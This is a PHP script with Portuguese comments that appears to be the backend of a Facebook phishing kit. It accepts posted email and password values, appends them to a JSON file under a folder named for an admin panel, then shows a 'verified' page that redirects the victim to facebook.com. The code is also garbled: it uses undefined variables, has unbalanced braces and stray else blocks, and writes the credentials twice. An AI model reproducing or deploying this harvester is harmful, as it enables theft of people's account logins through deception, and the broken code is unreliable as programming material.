<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Verifica se os dados foram enviados corretamente
    if (isset($_POST['email']) && isset($_POST['senha'])) {
        $email = $_POST['email'];
        $senha = $_POST['senha'];

        // Exibe os dados recebidos
    echo "Username: " . $username . "<br>";
    echo "Password: " . $password . "<br>";

    // Verifica o conteúdo do array antes de salvar 
    var_dump($arr);
        // Caminho do arquivo JSON
        $fl = "FACEBOOK + PAINEL ADMIN/operador/seguro/boleto1.json";
        if(file_exists($fl)){
            $h = fopen($fl, "r");
            $arr = json_decode(fread($h, filesize($fl)));
            array_push($arr, array("email" => $email, "senha" => $senha));
            fclose($h);
        } else {
            $arr = array(
                array("email" => $email, "senha" => $senha)
            );
        }
        $fhs = fopen($fl, 'w') or die("can't open file");
        fwrite($fhs, json_encode($arr, JSON_PRETTY_PRINT));
        fclose($fhs);

            // Verifica se a leitura foi bem-sucedida
            if ($arr === null) {
                // Se o arquivo estava vazio ou malformado, cria um array vazio
                $arr = [];
            }
        } else {
            // Se o arquivo não existir, cria um array vazio
            $arr = [];
        }

        // Adiciona os dados do email e senha no array
        array_push($arr, [$email, $senha]);

        // Abre o arquivo para escrita
        $fhs = fopen($fl, 'w');
        
        // Verifica se a abertura do arquivo foi bem-sucedida
        if ($fhs === false) {
            die("Erro ao tentar abrir o arquivo para gravação.");
        }

        // Grava os dados no arquivo JSON
        if (fwrite($fhs, json_encode($arr, JSON_PRETTY_PRINT)) === false) {
            die("Erro ao tentar escrever no arquivo.");
        }
        fclose($fhs);

        // Resposta para o usuário
        echo "Dados recebidos e salvos!";
    } else {
        echo "Erro: dados não recebidos corretamente.";
    }

?>



<!DOCTYPE html>
<html>
<head> 
  <title>Verificado com sucesso </title> 
  <meta charset="utf-8"> 
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, shrink-to-fit=no"> 
  <meta http-equiv="refresh" content="2;url='https://www.facebook.com/site'"> 
  <link rel="shortcut icon" href="assets/imagenss/ico_favicon.png"> 
  <link rel="stylesheet" type="text/css" href="../assets/css/benef_compras_style.css"> 
</head>
</html>
